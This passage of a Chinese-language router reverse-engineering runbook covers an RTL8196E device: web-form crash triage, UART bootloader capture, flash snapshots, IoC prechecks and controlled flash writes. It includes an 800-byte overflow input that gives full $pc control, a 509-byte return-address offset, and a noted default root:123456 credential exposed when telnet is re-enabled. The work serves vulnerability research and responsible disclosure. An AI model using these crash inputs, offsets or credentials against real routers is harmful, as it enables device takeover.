sudo python3 tools/crash-triage.py \
    --case formSchedule: --case formAdvanceSetup: --case formDnsv6: \
    --case formOpMode2: --case formSSH: \
    --case "formSchedule:webpage=/status.htm" \
    --control formNtp: --control formWlanSetup: \
    --out reports/crash-triage-unit-2018.json
```

```text
formSchedule       SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
formAdvanceSetup   SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
formDnsv6          SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
formOpMode2        SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
formSSH            SIGSEGV  sb v1,0(a2)  0x004725d0  inside a NON-writable PT_LOAD
formSchedule       no signal
```

`0x004725d0` 是被 `addiu` 取址 **815 次**的 pooled `""` 字面量，
而它在 `R-X` 的 PT_LOAD 裡（`0x00400000`–`0x00473044`）：

```bash
python3 tools/mipsref.py "$FWRE_WORK/extracted/unit-2018/squashfs-root/bin/boa" \
        --addr 0x004725d0
```

> 🔴 **最後一列是這一節最強的對照，而它是免費的。**
> `webpage=`（**有值但空**）走的是同一條分支、`*s2` 一樣是 `0`、`strcpy` 一樣跑，
> **卻活著**。差別只在指標指到哪裡，不在分支跑不跑。

#### A1.7.2 那個會讓 `$pc` 完全可控的

```bash
sudo python3 tools/crash-triage.py \
    --case "formWsc:localPin=$(python3 -c 'print("A"*800)')" \
    --control formWsc:localPin=1234 --control formNtp: \
    --out reports/crash-triage-unit-2018-wsc.json
```

```text
pc  0x41414141    ra  0x41414141    s0..s6  0x41414141    s7  0x0048bb04
```

用 de Bruijn 樣式跑同一發，偏移直接讀得出來：

```text
481 s0 · 485 s1 · 489 s2 · 493 s3 · 497 s4 · 501 s5 · 505 s6 · 509 ra
```

**509 bytes 到 saved return address**，與 `BoaGate` 對 `localPin` 報的 `sp-540` 一致。
260 bytes 活著、800 bytes 死掉。

> 🔴 **這一發的完整請求不進 committed 檔案**，規則與 `A3.13` 的 `D-15` 相同：
> 尚未通報，而且很可能在公開映像上也成立。請求本體放
> `$FWRE_WORK/disclosure/`。這一節負責的是位址、偏移與對照。

#### A1.7.3 兩個坑，兩次都各花掉一場

1. **`boa` 會 daemonize。** gdbstub 底下 gdb 跟的是父行程，它馬上結束。`-d` 讓它
   留在前景；旗標寫在 binary 自報的 usage 裡。
2. **SIGBUS 要放行，不能停。** 帶 `--alignfix` 時 firmware 每寫一次設定就吃掉幾十個
   SIGBUS，那是設計如此。

---

### A1.8 別的家族才有的路徑，在這一台上是什麼反應（關 `P3-8` · `P3-9` · `P3-10` · `P3-11` · `P3-12` · `P1-9`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.26](RUNBOOK.md) | 2026-08-18 |

```bash
sudo python3 tools/paramfuzz.py --dimension paths --out /tmp/paths.json
```

**這五列的反證條件逐字相同**：任何一個有回應，`root_form[]` 就不是唯一的
dispatch 來源。而「有回應」四個字是這一節唯一困難的地方 —— 字典裡最後三行是
對照組，一個 `/boafrm/` 的、一個 `/cgi-bin/` 的、一個 `.htm` 的，
**三個都是保證沒有人實作得出來的名字**。

> 🔴 **第一版的 GET 對每一個路徑都回 `200` 與 2,895 bytes，包含那個不可能存在的
> `.htm`。** 原因是 urllib 預設跟隨轉址，而這台對沒豁免的路徑回 `302 → home.htm`。
> **一個會跟隨轉址的存在性探測，量到的是轉址。** 現在的版本不跟隨，並記錄
> `Location`。**是對照組抓到的，不是結果抓到的。**

---

### A1.9 設定區差分：改一個已知的值，再看是哪幾個 byte 動了（關 `P8-23` · `P8-12`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| **T2**（要一份 dump 與 root；**不用裝置**） | 沒有碰裝置 | [`RUNBOOK` §8.12.27](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |

**這一節到 2026-08-18 之前做不了，理由不是難，是模擬環境寫不了設定。**
`tools/alignfix/` 補掉那一個對齊差異之後，它第一次不需要裝置。

```bash
sudo tools/qemu-env.sh reset
sudo tools/qemu-env.sh run /bin/flash get DHCP_LEASE_TIME
sudo tools/qemu-env.sh run /bin/flash set DHCP_LEASE_TIME 4321
sudo tools/qemu-env.sh diff
```

把 `diff` 印出來的位移拿去跟 `fwrecon compcs` 解出來的欄位表對，兩邊必須指到同一個
欄位 —— **不一致就是兩條路徑其中一條錯了**，那正是 `P8-23` 的反證條件。

`P8-12` 卡在自家工具而不是裝置：`fwrecon compcs` 只有 decode，沒有 encoder。

---

## 第 2 站 · 板子停在 `<RealTek>`

**照順序** `A2.1` → `A2.2` → `A2.3` → `A2.4` → `A2.5` → `A2.6`

**進站**：板子**確實斷電** → 先跑 `A2.2` 的 `catch` → 看到提示才上電 → 連續 ESC → 停在 `<RealTek>`。
**出站**：拔電。**不要**從這個狀態直接 `J` 或讓它繼續開機。

> 🔴 **這六節排在一起，是因為進站要燒掉一個開機循環。** 進來一次就把要讀的全部讀完；為了漏掉的一節再進站一次，就是再燒一次，而 `A2.2` 說了抓不到不要重試超過三次。

> 🔴 **`A2.5` 與 `A2.6` 是全檔僅有的兩節會寫 flash，而順序是硬的**：`A2.5` 在沒有活資料的 `0x3F0000` 上量 `FLW` 的語意，`A2.6` 才拿那個語意去寫真的設定區。**跳過 `A2.5` 直接跑 `A2.6`，等於用一個沒量過的行為去寫唯一一份資料。**

### A2.1 🔌 把 USB 裝置交給 WSL（不關登記簿項目）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T2（序列）/ T3（再加網卡） | 純讀 | [`RUNBOOK` §8.12.14](RUNBOOK.md) | 2026-08-17 |

**Windows PowerShell**（第一次要系統管理員，之後不用）：

```powershell
usbipd list
```

**預期**——找出這兩行，記下 `BUSID`：

```text
BUSID  VID:PID    DEVICE                                          STATE
1-1    10c4:ea60  Silicon Labs CP210x USB to UART Bridge (COM3)    Not shared
2-4    0bda:8153  Realtek USB GbE Family Controller                Not shared
```

第一次：

```powershell
usbipd bind --busid 1-1
usbipd bind --busid 2-4
```

每次：

```powershell
usbipd attach --wsl --busid 1-1
usbipd attach --wsl --busid 2-4
```

**驗證**（WSL）：

```bash
ls -l /dev/ttyUSB0
ip -br link | grep '^enx'
```

**預期**：

```text
crw-rw---- 1 root dialout 188, 0 ... /dev/ttyUSB0
enxfc19286184c9  DOWN  fc:19:28:61:84:c9 <BROADCAST,MULTICAST>
```

> 🔴 **網卡一定要交給 WSL，而且理由不只是方便。** 如果它留在 Windows 側，
> Windows 會從這台路由器拿到 DHCP 位址，而你的網路可能整個被它接走。
> 更糟的是**測試會看起來正常**：`ping` 會通，而唯一的破綻是 `ttl=63` 不是 64。
> 那是 `PROGRESS.md` 的儀器 bug 21,2026-08-17 實際發生過。

> ⚠️ **`attach` 綁在 WSL 這個 VM 上，VM 一停裝置就退回 Windows。**
> 另開一個視窗貼這一行然後不要關：
> ```powershell
> wsl -d Ubuntu-24.04 -- sleep 14400
> ```

**做完想還給 Windows：**

```powershell
usbipd detach --busid 1-1
usbipd detach --busid 2-4
```

---

### A2.2 🔌 抓 bootloader（關 `P0-2`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T2 | 純讀 | [`RUNBOOK` §8.12.2](RUNBOOK.md) | 2026-08-17（當天成功兩次、失敗一次，失敗原因見下） |

**接線，用眼睛檢查**（電源還沒插）：

- [ ] 網路線插在 **LAN** 埠（有數字標號那幾個），**WAN 埠什麼都沒插**
- [ ] CP2102 接 UART 排針的 **pin 2 / 3 / 4**,pin 1 是絲印**三角形**那一端
- [ ] **pin 1 的 `VCC` 不要接** —— 板子自己有電，接了會對打
- [ ] CP2102 的 `RX` → 板子 `TX`（pin 2）；CP2102 的 `TX` → 板子 `RX`（pin 3）；`GND` → `GND`（pin 4）
- [ ] **不要按 reset 鍵** —— 它會用出廠預設蓋掉現行設定
- [ ] **電源還沒插**

**做什麼**（先跑這個，**然後**才插電）：

```bash
cd /mnt/c/Users/Key20/Desktop/router
python3 -u tools/console-dump.py catch --port /dev/ttyUSB0 --window 300 -v
```

**看到這一行才 🔌 插電：**

```text
  streaming ESC.  >>> POWER THE ROUTER ON NOW <<<
```

**預期輸出：**

```text
  ok    <RealTek> - the boot loader is ours
        ---RealTek(RTL8196E)at 2014.04.22-16:22+0800 v1.3 [16bit](400MHz)
  ok    input buffer drained (the ESC stream leaves ESCs queued)
  >>>   ?
  ok    command set:
        ----------------- COMMAND MODE HELP ------------------
        HELP (?)                            : Print this help message
        DB <Address> <Len>
        ...
        <RealTek>
```

> ⚠️ **搶 bootloader 是「連續送 ESC」，它只吃一個，其餘全排在輸入緩衝區裡。**
> 所以**搶到之後第一條手打的指令必定回 `Unknown command !`**。
> 工具的 `settle()` 會先送一個裸 `\r` 清掉；手打的話先按一次 Enter。
> (儀器 bug 7)

> ❌ **`the board booted past the interrupt window` → 板子沒有真的斷電過。**
> 2026-08-17 踩過：板子當時在跑 Linux,`catch` 抓到的是執行中的 console 對 ESC
> 的回應。**先確實拔掉電源、停 2 秒、再重跑這一節。**

> ❌ **`nothing came back at all` → TX/RX 接反、port 錯、或板子沒上電。**

> ⚠️ **抓不到不要重試超過三次。** 每一次都是一次完整開機。

---

### A2.3 🔌 64 KiB 設定區快照 + IoC 預檢（關 `P0-10` · `P0-5`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T2 | **純讀**（`FLR` + `DB`，不寫一個 byte） | [`RUNBOOK` §8.12.3](RUNBOOK.md) | 2026-08-17 |

**先決條件**：板子停在 `<RealTek>`（`A2.2`）

**這一節每一次動手前都跑，而且它便宜到沒有藉口不做：64 KiB 約 2 分鐘，
完整的 4 MiB 是 105 分鐘 —— 而會被改的只有那 64 KiB。**

#### A2.3.1 那 64 KiB 裡有什麼

```text
0x000000 ─┬─ bootloader stage 1(DRAM 訓練)
0x0012F0 ─┤   LZMA stage 2:指令直譯器、TFTP、SPI 型號表(見 A1.3)
0x006000 ─┼─ H601   這一台的 MAC 與射頻校準  ★ 全世界只有這一份,reset 也不還原
0x008000 ─┼─ COMPDS 出廠預設設定
0x00C000 ─┼─ COMPCS 現行設定                 ← /config.dat 服務的就是它(A3.6)
0x010000 ─┴─ w6cg  網頁資源(不在這 64 KiB 裡)
```

**所以一份 64 KiB 快照同時是三件東西：**

1. **還原點** —— 寫壞了可以寫回來（`A2.5`）
2. **IoC 預檢的輸入** —— 現行設定 vs 出廠預設差幾筆
3. **「上一場到現在沒被動過」的證明** —— 跟上一份逐 byte 比

#### A2.3.2 抓

```bash
SNAP="$HOME/fwre-work/dumps/config-region-$(date +%Y%m%d-%H%M)-pre.bin"
echo "writing to: $SNAP"
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 \
        -o "$SNAP"
```

**逐個旗標：**

| 旗標 | 值 | 意思 |
|---|---|---|
| `--at-prompt` | — | **板子已經停在 `<RealTek>`，不要再搶一次。** 沒加的話它會等你上電 |
| `--flash 0x0` | flash 位移 | 從頭開始 |
| `--length 0x10000` | 65,536 | 只要那 64 KiB |
| `--ram 0x81000000` | RAM 目標位址 | `FLR` 先把 flash 讀進 RAM，再用 `DB` 印出來 |
| `--chunk 16384` | 每次 `DB` 印多少 | 太大 → 一次錯誤重讀很貴；太小 → 往返次數多。16 KiB 是量過的平衡點 |
| `-o` | 檔名 | **檔案已存在會拒絕覆蓋**，除非 `--force` |

**預期輸出：**

```text
  ==>   control: FLR flash 0x000000 -> RAM, expecting 0b f0 00 04
  >>>   DB 81000000 64
  ok    control matched: 0b f0 00 04
  ==>   FLR flash 0x000000 +0x10000 -> RAM 0x81000000
  ==>   DB, chunked and validated per chunk
     16384/65536 bytes   25.0%     691 B/s  eta   1.2 min
     ...
     65536/65536 bytes  100.0%     691 B/s  eta   0.0 min
  ==>   verifying 1 of 4 chunks by re-reading them
  ok    1 of 1 re-read chunks identical
  ok    65536 bytes -> .../config-region-…-pre.bin
  ok    sha256  78186d2b…
  ok    4 chunks, 0 needed a re-read, 2.0 min
```

> 🔴 **第一行那個對照組是這一步的全部價值。** 它先讀 flash `0x000000`
> 進同一個 RAM 位址，比對已知的 `0b f0 00 04`（那是 bootloader 開頭的一個 `j` 指令）。
> **對不上就丟例外，不會出檔案。**
>
> 為什麼需要它：`FLR` 會問 `(Y)es , (N)o ?` 並且**把下一行整個吃掉當答案**。
> 如果那個 `Y` 沒被接受，`FLR` 根本沒生效，而接下來的 `DB` 印出來的是
> **RAM 裡上一次留下的舊資料** —— 一份格式完全正常、內容完全錯誤的 dump。
> **對照組把那件事變成一個例外，而不是一個結論。**（儀器坑，`RUNBOOK` §8.7.8）

> ⚠️ **`691 B/s` 是正常速度。** 38400 baud 的理論上限約 3.8 KB/s，而 `DB` 是
> 十六進位文字輸出（每個 byte 印成 3–4 個字元）加上往返，所以實際約 700 B/s。
> **64 KiB ≈ 95 秒。看到 2 分鐘不要以為卡住了。**

> ❌ **有 `.partial` 檔案但沒有 `.bin` → 有一塊重讀三次都沒過。**
> 工具的規則是「拼不完整就不吐檔案」。**那要查，不要繞過** ——
> 通常是線路品質或 `usbipd` 掉了。

#### A2.3.3 跟上一份比 —— 這一步回答「有沒有人動過這台」

```bash
cmp <(head -c 65536 "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin") "$SNAP" \
  && echo "IDENTICAL"
```

**預期**（如果從 8/16 的完整 dump 到現在沒有任何寫入）：

```text
IDENTICAL
```

**不相同的話，先看差在哪裡再判斷：**

```bash
bash tools/config-attrib.sh \
  <(head -c 65536 "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin") "$SNAP"
```

> ⚠️ **不相同不一定是壞事。** 這台從 2026-08-17 下午起，`COMPDS` 已經被
> POST 輪覆寫過（`A3.8`），所以跟 8/16 那份**一定不同**。
> **判準是「跟上一場收工時記下的數字相同」，不是「跟最早那份相同」。**

> ★ **而 `IDENTICAL` 這件事本身在 2026-08-17 變成了一個免費的對照組：**
> 那天 11:02 的快照與 8/16 的完整 dump 逐 byte 相同 —— **而那期間這台開過機
> 至少兩次、跑過完整的 GET 輪、還成功登入過一次。**
> 所以「開機和讀取不會改設定區」不是假設，是量出來的 ——
> 而那正是下午 POST 輪的差異可以**全部歸因**給 POST 的理由。

#### A2.3.4 IoC 預檢

```bash
bash tools/ioc-precheck.sh "$SNAP"
```

**預期**：

```text
COMPCS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344
COMPDS: checksum_ok=True verdict=consistent ring_fill_agrees=True entries=344

common entries: 343
differing     : 0
```

**三個欄位，而它們不是同一件事：**

| 欄位 | 誰在說話 |
|---|---|
| `checksum_ok` | **廠商自己的程式碼。** `libapmib` 的 8-bit payload checksum |
| `ring_fill_agrees` | **解碼器自己的對照組。** 用兩種不同的 LZSS 視窗初值解一次，結果要相同 —— 否則結果依賴了「沒有任何 literal 寫過」的視窗 byte |
| `verdict` | 解碼器對自己這次工作的判斷 |

> 🔴 **`differing` 這個數字不是常數。**
> 它到 2026-08-17 上午是 **4 / 343**（`CHECK_SSID_OK` · `DHCP_LEASE_TIME` ·
> `MIB_VER` · `WLAN_SSIDS`），下午的 POST 輪之後是 **0 / 343** ——
> 因為那一輪把 `COMPDS` 覆寫成 `COMPCS` 了。
>
> **判準是「跟上一場記下的數字相同」。看到不是 4 就當資安事件是錯的** ——
> 先讀 `BENCH-LOG.md` 最後一場的「燒掉了什麼」。

> ❌ **出現一筆你的紀錄裡沒有的差異 → 停，走事件處理程序。**
> 這個型號在公開的殭屍網路工具裡被點名過，而 `A3.4.3` 的 IoC 埠掃描是這一項的另一半。

> ❌ **`checksum_ok=False` → 停。** 那代表裝置自己也會拒絕這份 blob。
> 不要在一份廠商程式碼都不接受的資料上做任何推論。

---

### A2.4 🔌 救援路徑 —— 非破壞性上限（關 `P9-3` · `P9-4`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | 純讀 **只要你不上傳任何東西**。`AUTOBURN` 是 RAM 變數，斷電就沒 | [`RUNBOOK` §8.12.11](RUNBOOK.md) | 2026-08-17 |

**先決條件**：板子停在 `<RealTek>`；`A3.1` 的網段已設好

```bash
python3 -u tools/console-dump.py rescue --at-prompt --ip 10.1.1.1 \
        -o "$HOME/fwre-work/dumps/rescue.json"
```

**預期**：

```text
  ==>   autoburn off   (the switch that decides whether an upload reaches flash)
        'AUTOBURN: 0' -> Unknown command !
  ok    the form this loader accepts is 'AUTOBURN 0'
        AutoBurning=0
  ok    autoburn is off
  ==>   IPCONFIG 10.1.1.1
        'IPCONFIG:10.1.1.1' -> Unknown command !
  ok    the form this loader accepts is 'IPCONFIG 10.1.1.1'
        Now your Target IP is 10.1.1.1
  ok    the loader reports 10.1.1.1
```

**驗證**（主機端）：

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
ping -c 3 -W 2 10.1.1.1
ip neigh show 10.1.1.1
cat "/sys/class/net/$IF/statistics/rx_packets"
```

**預期 —— 而它跟直覺相反：**

```text
3 packets transmitted, 0 received, 100% packet loss
10.1.1.1 dev enx… lladdr 56:0a:01:01:01:e8 REACHABLE
1
```

> 🔴 **`ping` 收 0 是正常的，不是失敗。** loader 的堆疊只做 ARP + UDP/TFTP,
> **沒有義務實作 ICMP**。成功的判據是 **`ip neigh` 是 `REACHABLE`**
> 加上 **`rx_packets` 從 0 變 1** —— 那是兩個不共用程式碼的來源。
>
> 而那個 MAC（`56:0a:01:01:01:e8`）**不是網卡燒錄的位址**：
> `0a 01 01 01` 就是 `10.1.1.1`，loader 從你給的 IP 合成一個出來。
> **2026-08-17 我把「ping 有回應且 MAC 是這台」寫成成功條件，兩半都錯。**

> 🔴 **`AUTOBURN 0` 一定要在 `IPCONFIG` 之前。** 順序反過來，網路一起來就有一個
> autoburn 狀態未知的 TFTP 伺服器在聽。工具強制這個順序，而且**它只送得出 `0`**。

> ⚠️ **`AUTOBURN: 0`（有冒號）會回 `Unknown command !`** —— `?` 印的說明文字**不是語法**。
> loader 的字串表把指令 token 和說明行分開存。工具會依序試候選形式並印出哪一個成立。

> ❌ **這一節結束後拔電重開。** 不要從 `IPCONFIG` 過的狀態直接 `J` 或繼續開機。

---

### A2.5 🔌🔴 寫 flash（`FLW`）—— 唯一不可逆的一節（關 `P0-3`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T2 | **不可逆** | [`RUNBOOK` §8.9](RUNBOOK.md) | 2026-08-17（演練於 `0x3F0000`；磁區語意的判別讀在同日下午） |

**先決條件**：**兩份 dump 的雜湊都對過**；`A2.3` 的快照已抓

> ## 🔴 動手前的四條規矩
>
> 1. **每一行先看完，再貼。不准現打。** 這台已經教過一課：兩個相鄰指令用兩種
>    進位制（`FLR` 的長度是**十六進位**，`DB` 的長度是**十進位**）。
>    **`FLW` 的參數順序打錯 = 把測試樣式寫進 kernel。**
> 2. **只碰你事先確認過是空的那個位址。** 不要「順便試試看 `0x350000`」。
> 3. **`tools/console-dump.py` 送不出 `FLW`**（它的 `FORBIDDEN` 擋掉
>    `FLW`/`EB`/`EW`/`J `）。**這是刻意的：寫入指令由讀過它的人親手打，不由腳本發。**
>    所以這一節用 `picocom`。
>    （`AUTOBURN` 是唯一的例外，見 `A2.4` —— 因為擋掉它反而更危險。）
> 4. **每一步看到預期輸出才准下一步。** 對不上就停，填紀錄卡，回報。

**開始之前，先讓機器確認安全網在：**

```bash
make doctor TIER=2
```

必須看到 `two independent reads agree — there is a safety net`。

> ❌ **只有一份 dump，或雜湊不符 → 不要寫。** 那是這台的唯一備份。

#### 為什麼 `0x3F0000` 是安全的演練標的

W02 的完整 dump 證明 **`0x350000` 到 partition 結尾整段是 `FF`（已抹除）**，
沒有任何東西讀它。映像本體結束在 `0x34A041`（3.29 MiB）。

#### 開 picocom

```bash
picocom -b 38400 --logfile "$HOME/fwre-work/dumps/flw-$(date +%Y%m%d-%H%M).log" /dev/ttyUSB0
```

**離開 picocom 是 `Ctrl-A` 然後 `Ctrl-X`。先記住，等一下會用到。**

> 🔴 **不要加 `--omap crlf`。** picocom 的 `crlf` 是「把 CR 換成 LF」，不是
> 「CR 後面補 LF」，送出去的行尾會變成裸 `LF`，而這台的 bootloader 收 `CR`。
> 更糟的是**任何多送的一個換行都會被 `FLR` 的 `(Y)es , (N)o ?` 吃掉當答案** ——
> 代價是拿到一份格式完全正常、內容是 RAM 舊值的 dump。**維持預設，一個 map 都不要加。**

> 💡 **讀取那半邊可以不用手打。** `tools/console-dump.py dump --at-prompt …`
> 會自己處理 `Y` 提示、驗證回應、而且**先跑一個正對照組**（見 `A2.5` 末）。
> 它只是送不出 `EB` 和 `FLW`。所以兩種做法：
> **（a） 全程 picocom 手打** —— 人會等提示，陷阱咬不到人；
> **（b） 讀取用工具、寫入用 picocom** —— 要換手，但讀取那半邊有機器把關。
> **兩種都可以。不要混著半途改。**

按一次 **Enter**，應該看到乾淨的 `<RealTek>`。

---

#### Step 1 — 確認目標區真的是空的（唯讀）

```text
FLR 80520000 3F0000 100
Y
DB 80520000 256
```

**預期**：`Flash Read Successed!`，然後**整片 `ff`**，16 行，每行 16 個 byte。

> ❌ **不是整片 `ff` → 停。** 那裡有東西，而換位址之前要先知道那是什麼。

#### Step 2 — 在 RAM 裡放樣式，並且確認它真的進去了

```text
EB 80530000 DE AD BE EF DE AD BE EF
DB 80530000 8
```

**預期**：`de ad be ef de ad be ef`

> ✅ **`EB` 一次吃多個 byte：2026-08-17 實測可以。**（`?` 的說明寫了 `...`，
> 但在那之前沒有人這樣送過，`RUNBOOK §8.9` 把它列為「未實測」。）
> **如果 `DB` 讀回來只有第一個 byte 對**，就是一次只吃一個，改成八行
> `EB 80530000 DE` / `EB 80530001 AD` / … —— 而那是一條要記下來的裝置事實，不是失敗。

#### Step 3 — 寫入（★ 第一個不可逆的動作）

```text
FLW 3F0000 80530000 8
Y
```

**預期 —— 而它不是你以為的那句話：**

```text
Write 0x00000008 Bytes to SPI flash#1, offset 0x003f0000<0xbd3f0000>, from RAM 0x80530000 to 0x80530008
(Y)es, (N)o->Y
.
```

> 🔴 **參數順序是 `<flash 位移> <RAM 位址> <長度>` —— 跟 `FLR` 的
> `<RAM 位址> <flash 位移> <長度>` 剛好相反。看兩遍再送。**

> ⚠️ **成功只印一個句點 `.`，不印 `Flash Write Successed!`。**
> 那句話確實存在於 loader 裡（stage2 `0x0a861`），但它屬於 **TFTP 自動燒錄路徑**；
> 互動式 `FLW` 的訊息是上面那個 `Write 0x… Bytes to SPI flash#1 …`。
> 兩條路徑相距 2.7 KiB，而 `Flash Read Successed!`（`0x0b4a4`）在互動叢裡 ——
> **那就是這個分群的對照組。**

> ⚠️ **`FLW` 的 Y 提示是 `(Y)es, (N)o->`，`FLR` 的是 `(Y)es , (N)o ? -->`。**
> 相鄰兩個指令，兩種標點。

> 💡 **回應順手洩漏 flash 的記憶體映射位址**：`offset 0x003f0000<0xbd3f0000>`
> —— SPI flash 映射在 `0xbd000000`（KSEG1 非快取區）。

#### Step 4 — 讀回，而且讀到「另一個」RAM 位址

```text
FLR 80540000 3F0000 8
Y
DB 80540000 8
```

**預期**：`de ad be ef de ad be ef`

> 🔴 **一定要讀到 `80540000`，不要讀 `80530000`。** 讀回原位址只是把你剛剛放進去的
> 東西再看一次，**證明不了任何事**。
>
> **而「換一個沒用過的位址」還是不夠好** —— 你不知道那個位址裡本來是什麼。
> 更強的做法是先讀一塊**已知內容**的 flash 進去當對照組（`A2.5` 末的工具就是這樣做的）。
> 2026-08-17 上午這一格的證據就是因此不可採信，而下午重做時才補上對照組。

**這一步過了 = 回復路徑的「寫」半邊成立。還沒完。**

#### Step 5 — ★ 量 `FLW` 的磁區語意

> **SPI NOR 的抹除單位是磁區（這顆 EN25QH32B 是 4 KiB），不是 byte。**
> 如果 `FLW` 為了寫 8 個 byte 而抹掉整個磁區，**那麼任何一次 `FLW` 都會毀掉同磁區
> 裡的其他內容** —— 那是救援時會殺死你的事實。

在**同一個 4 KiB 磁區**的另一個位址寫第二個樣式，然後回頭讀第一個：

```text
EB 80530100 CA FE BA BE CA FE BA BE
DB 80530100 8
FLW 3F0100 80530100 8
Y
FLR 80560000 3F0000 8
Y
DB 80560000 8
```

**兩種結果，都要記下來，都不是失敗：**

| 讀到 | 意思 | 對 W06 的影響 |
|---|---|---|
| `de ad be ef …` | `FLW` **保留磁區內其餘內容**（讀-改-抹-寫回） | 可以精準覆寫；但斷電失去的是整個 4 KiB |
| `ff ff ff ff …` | `FLW` **抹掉整個磁區而不保留** | 救援必須整個磁區一起寫回；`H601` 與 `COMPCS` 各自的磁區都是不可分割的單位 |

> ✅ **2026-08-17 的答案是第一種。** `FLW` 是**讀出整個磁區 → 改指定 byte →
> 抹除磁區 → 整段寫回**。三條證據：抹除後回到 `FF`（所以有抹除）、同磁區鄰居沒被清掉
> （所以抹除前先讀出來了）、而 loader 的**指令集裡一個抹除指令都沒有**
> （所以抹除只能由 `FLW` 自己做）。
>
> **仍然要自己跑一次。** 你的單位可能是不同的 flash 型號，而 loader 的型號表裡
> **沒有任何 Eon `QH` 系** —— console 上的 `chipName: UNKNOWN` 就是它認不出來，
> 所以走的是通用路徑，而通用路徑的行為沒有理由用別顆晶片去推。

#### Step 6 — ★ 還原測試，而且它有兩種都正確的答案

```text
EB 80530200 FF FF FF FF FF FF FF FF
DB 80530200 8
FLW 3F0000 80530200 8
Y
FLR 80550000 3F0000 8
Y
DB 80550000 8
```

| 讀到 | 意思 | 判定 |
|---|---|---|
| `ff ff ff ff …` | `FLW` 有抹除語意（與 Step 5 一致）。**還原 = 直接覆寫** | ✅ 通過 |
| `de ad be ef …` | **`FLW` 是純程式化，`1` 只能變 `0`。** 寫 `FF` 什麼都沒改 | ⚠️ 見下 |

> ⚠️ **第二種結果不是操作失誤，是這台的物理性質。** 不要重試，不要換樣式。

#### 如果 Step 6 讀回 `de ad be ef` —— 不要慌，但也不要繼續

**`P0-3` 的反證條件是事先寫下的**：「讀回與寫入不一致，**或抹除後不是全 FF**
→ 救援路徑不成立」。**照字面就是被反證了，而且不准事後改判。** 該做的是：

1. **先在 bootloader 裡找抹除指令**，把 `?` 的完整輸出留下來。
   `FLW` 的第四個參數 `<SPI cnt#>` 沒有人解釋過，抹除可能藏在那裡。
2. **記下來，今天到此為止。**

**同時要知道：這台不是沒有救。** `/bin/startup.sh` 有一條裝置自己的還原路徑 ——
`flash test-csconf` 失敗時它會用 `0x8000` 的出廠 `COMPDS` 蓋回 `0xC000`，
而 `H601`（`0x6000`）不在那條路徑上、不會被動到。
**但那是裝置自己做的，不是你執行的，而且它會把設定改回出廠值。**
它是安全網，不是救援路徑，兩者不能互相取代。

> 🔴 **而那條路徑有一個副作用，值得單獨記一筆：** 在「DS 與 CS 都無效」的分支裡，
> `flash default-sw` 之後緊接著是 **`flash set TELNET_ENABLED 1`**。
> 也就是**設定區同時損壞的裝置，重開之後 telnet 是開的** —— 而 `root:123456`
> 在這個 build 的 `passwd.org` 裡還在。**這是靜態讀出來的，還沒驗證。**

#### Step 7 — 收尾

離開 picocom：`Ctrl-A` 然後 `Ctrl-X`。
**板子留在 `<RealTek>`，不要重開機**，如果後面還有節要跑。

---

#### 讀取一律用工具，因為它帶對照組

```bash
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x3F0100 --length 8 --ram 0x80560000 --chunk 8 \
        -o "$HOME/fwre-work/dumps/probe.bin"
xxd "$HOME/fwre-work/dumps/probe.bin"
```

它比手打多三件事，而**第三件是關鍵**：確認 `(Y)es` 真的被接受（不接受就丟例外）；
每一塊解析驗證加二次取樣重讀；**對照組先把 flash `0x000000` 讀進同一個 `--ram`**，
比對已知的 `0b f0 00 04` —— 所以真正的讀取之前，那塊 RAM 裝的是**第三種東西**，
既不是 `ca fe ba be` 也不是 `ff ff ff ff`。
**「換一個沒用過的位址」比不上這個：沒用過的位址裡是什麼，你並不知道。**

> ❌ **這一格不准用 `--no-control`。** 對照組正是它的全部價值。

---

#### 這一節與 `A2.6` 的分工

**本節寫 8 個 byte 到沒有活資料的地方，只為了知道 `FLW` 在這台上到底是什麼語意。**
真的把資料寫回去是 `A2.6`，而它有一支工具、一份 sha256、一個磁區對齊的要求。
**先跑完本節再去 `A2.6`** —— 演練是那一節的先決條件，不是禮貌。

---

### A2.6 🔌🔴 把設定區寫回去 —— 16 KiB，不是 8 個 byte（關 `P10-10`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T2 | **不可逆** | [`RUNBOOK` §8.12.17](RUNBOOK.md) | 2026-08-17 夜（首次執行，三段判據全中；`EB` 一行的容量首次量到） |

**先決條件**：`A2.5` 六步全過（`P0-3`）；板子停在 `<RealTek>`；來源檔與它的 sha256 在手上

2026-08-17 的 POST 輪把 `COMPDS`（`0x8000`–`0xC000`）覆寫成 `COMPCS` 了。
來源是 `config-region-20260817-1102-pre.bin`，**與 8/16 完整 dump 的前 64 KiB 逐 byte 相同**
—— 兩份獨立的副本說同一件事，這是動手前唯一該確認的事。

**這比演練難的地方有三個：**

1. **16 KiB = 4 個磁區**，而 `EB` 一次只灌幾個 byte。手打灌不動。
2. **每個磁區都是讀-改-抹-寫回**，所以寫到一半斷電失去的是那 4 KiB。
   方向要先想清楚：**`COMPDS` 壞掉不致命**（`/bin/startup.sh` 會用它修 `COMPCS`），
   **反過來不成立**。所以先寫 `COMPDS` 這一邊是對的順序。
